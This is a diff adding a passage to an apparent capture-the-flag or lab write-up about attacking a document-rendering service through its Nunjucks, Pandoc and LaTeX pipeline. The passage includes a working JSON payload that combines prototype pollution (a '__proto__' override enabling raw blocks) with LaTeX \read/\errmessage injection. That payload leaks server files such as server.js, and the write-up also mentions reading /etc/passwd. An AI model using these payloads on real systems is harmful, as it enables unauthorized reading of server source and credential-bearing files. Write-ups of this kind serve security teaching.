@@ -502,3 +502,143 @@ User Context: The process runs as aegis-render but was started via sudo by webad
 **Making AllowRawBlocks to True but i receive that this its just affecting Pandoc (allowing raw LaTeX blocks to pass through), am sure am playing around to chain all things to found the real and functional attack path so we need just to be more overlooking all things together**
 {% endhint %}
 
+{% hint style="warning" %}
+#### The Rendering Pipeline Explained
+
+When we click Render Preview :
+
+**Stage 1: Nunjucks (Node.js Template Engine)**
+
+**Stage 2: Pandoc (Document Converter)**
+
+**Stage 3: pdflatex (LaTeX Compiler)**
+
+**Stage 4 & 5: dvips & Ghostscript (PostScript to PDF)**
+{% endhint %}
+
+**but we hit a hard block, like the app relies on a strict configuration  object to decide whether to enable dangerous features**
+
+**If we can pollute that object's prototype, we can change the application's behavior without having direct access to the code**
+
+**looking at devtools network the response when we click render we confirm what we said**&#x20;
+
+{% code overflow="wrap" %}
+```js
+{
+    "ok": true,
+    "finalStage": "gs",
+    "artifactPath": "/var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.final.pdf",
+    "durationMs": 365,
+    "stages": [
+        {
+            "stage": "nunjucks",
+            "code": 0,
+            "durationMs": 4,
+            "stderr": "",
+            "stdout": ""
+        },
+        {
+            "stage": "pandoc",
+            "code": 0,
+            "durationMs": 14,
+            "cmd": "/usr/bin/pandoc --from markdown-raw_attribute --to latex --standalone --template /var/lib/aegis-render/jobs/job-1783095028914-54814c12/authcert.tex -o /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.tex /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.md",
+            "stderr": "",
+            "stdout": ""
+        },
+        {
+            "stage": "pdflatex",
+            "code": 0,
+            "durationMs": 141,
+            "cmd": "/usr/bin/pdflatex -interaction=batchmode -no-shell-escape -output-directory /var/lib/aegis-render/jobs/job-1783095028914-54814c12 /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.tex",
+            "stderr": "",
+            "stdout": "This is pdfTeX, Version 3.141592653-2.6-1.40.28 (TeX Live 2025/Debian) (preloaded format=pdflatex)\nentering extended mode\n"
+        },
+        {
+            "stage": "latex",
+            "code": 0,
+            "durationMs": 122,
+            "cmd": "/usr/bin/latex -interaction=batchmode -no-shell-escape -output-directory /var/lib/aegis-render/jobs/job-1783095028914-54814c12 /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.tex",
+            "stderr": "",
+            "stdout": "This is pdfTeX, Version 3.141592653-2.6-1.40.28 (TeX Live 2025/Debian) (preloaded format=latex)\nentering extended mode\n"
+        },
+        {
+            "stage": "dvips",
+            "code": 0,
+            "durationMs": 21,
+            "cmd": "/usr/bin/dvips -q -o /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.ps /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.dvi",
+            "stderr": "",
+            "stdout": ""
+        },
+        {
+            "stage": "gs",
+            "code": 0,
+            "durationMs": 61,
+            "cmd": "/usr/bin/gs -dBATCH -dNOPAUSE -dSAFER -dQUIET -sDEVICE=pdfwrite -sOutputFile=/var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.final.pdf /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.ps",
+            "stderr": "",
+            "stdout": ""
+        }
+    ]
+}
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
+
+**if we can control Pandoc mechanism we can successfully leak all data because using latex injection  because the problem is when we read arbitary data the pandoc crash we receive pieces from file but it can't lead us to nothing or may we should be more polluating the prameters**
+
+<figure><img src=".gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+**`! LaTeX Error: Can be used only in preamble.` - `\usepackage{verbatim}` can only be used before `\begin{document}`, but our template body is injected into the document body, so it failed, and also we cant use external package**
+{% endhint %}
+
+**current `body` is just raw TeX commands, but Pandoc sees them as text and escapes them.**
+
+<figure><img src=".gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+**This also doesnt work**&#x20;
+
+**finally after using this blog** [**https://rxiv-maker.henriqueslab.org/advanced/latex-injection/**](https://rxiv-maker.henriqueslab.org/advanced/latex-injection/)
+
+**i can have multipe method to inject, in fact we succesffuly inject before but we get the data crashed sometimes we know the webroot but when we reed to red the server.js i couldn't**
+
+<mark style="color:red;">**I have one question in mind why the /etc/passwd i read it using /input but a complex code i cant ?**</mark>
+
+**After deep searching i found that**&#x20;
+
+{% hint style="info" %}
+When we  use `\input{server.js}`, TeX doesn't just read the file - it **typesets** it. This means:
+
+* Every character is interpreted through the **catcode table** (so `_` becomes subscript, `$` becomes math mode, etc.)
+* The **font engine** switches fonts based on the content (that's why you see `\OML/lmm/m/it/10` prefixes)
+* The **paragraph builder** breaks long lines and creates overfull hbox warnings
+* Special characters like `/` get converted to `=` due to font encoding
+{% endhint %}
+
+{% hint style="info" %}
+The `\read` primitive is a **low-level file I/O operation** that:
+
+* Reads raw bytes from the file
+* Stores them directly into a macro variable **without any interpretation**
+* No catcode conversion
+* No font switching
+* No paragraph building
+* The data remains a pure string
+{% endhint %}
+
+<figure><img src=".gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
+
+**The `\typeout` command is being suppressed because `pdflatex` is running with `-interaction=batchmode`. We need a different approach to exfiltrate the data.**\
+**so we use the errmessage**
+
+{% code overflow="wrap" %}
+```
+{
+  "body": "\\newread\\file \\openin\\file=/home/webadmin/aegis/server.js \\loop\\unless\\ifeof\\file \\read\\file to\\myline \\errmessage{\\myline} \\repeat \\closein\\file",
+  "overrides": "{\"__proto__\":{\"allowRawBlocks\":true},\"audience\":\"internal\",\"ceremony_witness\":\"s.vrana\"}"
+}
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+
